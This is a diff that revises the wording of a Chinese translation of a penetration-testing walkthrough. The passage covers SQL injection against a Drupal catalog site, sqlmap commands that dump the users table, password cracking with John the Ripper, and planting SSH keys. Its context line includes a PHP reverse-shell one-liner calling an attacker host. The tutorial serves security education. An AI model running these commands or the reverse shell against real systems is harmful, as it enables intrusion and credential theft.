@@ -493,18 +493,18 @@ $sock=fsockopen("FrontGun_IP",443);exec("/bin/sh <&3 >&3 2>&3");
 
 我们可以推断，可能正在向后端服务器（最有可能是数据库）发出请求，以便根据提供的ID（上述请求中的13）获取产品。我们尝试通过注入特殊字符（引号、双引号等）进行进一步的探索，但没有什么有趣的结果：服务器用同样令人失望的空白页进行响应。
 
-但是，如果我们用“14-1”替换13，如会得到产品13。很有趣！这可能意味着算术运算实际上是由后端系统执行的。为了确认，再次使用“product/13+1”和“product/（select 14）”。 ![](.gitbook/assets/34.id2.png)
+但是，如果我们用“14-1”替换13，如会得到产品13。很有趣！这可能意味着算术运算实际上是由后端系统执行的。为了确认，再次执行“product/13+1”和“product/（select 14）”。 ![](.gitbook/assets/34.id2.png)
 
 很好！这很可能是碰到了代码注入的情况。特别是SQL注入，因为之前的“select”语句也被正确地解释了。这意味着我们可以诱使数据库执行附加到请求末尾的SQL代码。当然，代码既要有效，又要尊重一些语法和结构规则，但我们不必太担心它。
 
 事实上，我们将依赖于臭名昭著的“sqlmap”工具来完成繁重的工作，并进行下一步的攻击。这个工具将准备必要的SQL代码来列出表并获取列、数据等，但是不要马上兴奋起来。这个网站似乎只提供公共信息，不会这么容易让你得到宝贵的客户数据。
 
-那么SQL注入有什么用呢？在这个场景中，我们感兴趣的是能够在机器上执行系统代码。这几乎完全取决于安装的数据库软件:
+那么SQL注入有什么用呢？在这个场景中，我们感兴趣的是能否在机器上执行系统代码，当然这基本要看安装的是什么数据库软件:
 
 * 如果发出命令的帐户具有管理员权限，则Microsoft SQL Server提供了使用xp\_cmdshell在系统上执行代码的本机函数。
-* MySQL和Oracle只提供了将文件写入他们有权访问的目录的功能。一个有趣的场景是将后门写入web目录，甚至将SSH密钥写入主文件夹。
+* MySQL和Oracle只提供了将文件写入他们有权访问的目录的功能。一个有趣的场景可以将后门写入web目录，甚至将SSH密钥写入主文件夹。
 
-为了确定数据库软件，我们使用以下选项启动“sqlmap”:
+为了确定数据库软件，可以使用以下选项启动“sqlmap”:
 
 ```text
 FrontGun$ sqlmap -u catalog.sph- assets.com/product/14* --banner
@@ -512,9 +512,9 @@ FrontGun$ sqlmap -u catalog.sph- assets.com/product/14* --banner
 
 ![](.gitbook/assets/35.db-and-table.png)
 
-> 提示：由于没有容易识别的参数，我们在易受攻击的参数前面放置了一个星号（\*）来指导sqlmap。
+> 提示：由于没有容易识别的参数，可以在易攻击的参数前面放置了一个星号（\*）来指导sqlmap。
 
-我们似乎要面对一个MySQL数据库。尽管以web目录和主文件夹为目标仍然是一个可行的选择，但让我们先看看其中的内容。 我们使用以下命令列出所有数据库及其表:
+看起来似乎是一个MySQL数据库，虽然可以用web目录和主文件夹作为攻击目标，但先看看其中的内容。 先使用以下命令列出所有数据库及其表:
 
 ```text
 FrontGun$ sqlmap -u catalog.sph-assets.com/product/14* --tables
@@ -522,7 +522,7 @@ FrontGun$ sqlmap -u catalog.sph-assets.com/product/14* --tables
 
 ![](.gitbook/assets/35.dbversion.png)
 
-表是典型的Drupal CMS——我们可以通过查看网页的HTML代码轻松确认信息。 根据Drupal 8官方网站，用户和密码数据存储在“users\_field\_data”表中:
+表是典型的Drupal CMS——这可以通过查看网页的HTML代码轻松确认信息。 根据Drupal 8官方网站，用户和密码数据存储在“users\_field\_data”表中:
 
 ```text
 FrontGun$ sqlmap -u catalog.sph-assets.com/product/14* -T users_field_data --dump
@@ -530,11 +530,11 @@ FrontGun$ sqlmap -u catalog.sph-assets.com/product/14* -T users_field_data --dum
 
 ![](.gitbook/assets/36.userstable.png)
 
-密码是在数据库中散列的，所以我们需要使用“John the Ripper”这样的工具来破解密码。John the Ripper基本上会检查单词词典（单词列表），看看哪一个匹配每个给定的散列。然而，计算散列需要计算时间，并且可能需要相当多的资源，特别是在测试数十亿种可能性时。
+密码是在数据库中散列的，则需要“John the Ripper”这样的工具来破解密码。John the Ripper基本上会检查单词词典（单词列表），看看哪一个匹配每个给定的散列。然而，计算散列需要计算时间，并且可能需要相当多的资源，特别是在测试数十亿种可能性时。
 
-我们也可以尝试公开的破解数据库来正确地处理这个任务。如果你能接受挑战，你可以按照本教程的要求，以合理的预算建造一台可靠的破解机。
+我们也可以尝试公开的破解数据库来正确地处理这个任务。如果你进一步挑战，可以按照本教程的要求，用合理的预算建造一台可靠的破解机。
 
-不幸的是，Drupal的散列是加盐的（密码前面有一个随机字符串），这使得破解它们非常耗时。即使在John the Ripper破解数小时后，我们也无法取得积极的结果。看起来密码很强。我们唯一的另一个选择是植入SSH密钥。
+不幸的是，Drupal的散列是加盐的（密码前面有一个随机字符串），这使得破解它们非常耗时。即使在John the Ripper破解数小时后，还是没有获得有效的回报，看上去是强密码，那我们唯一方法就是植入SSH密钥。
 
 首先，我们通过以下三个简单的步骤生成一对SSH密钥: ![](.gitbook/assets/37.sshkey.png)
 
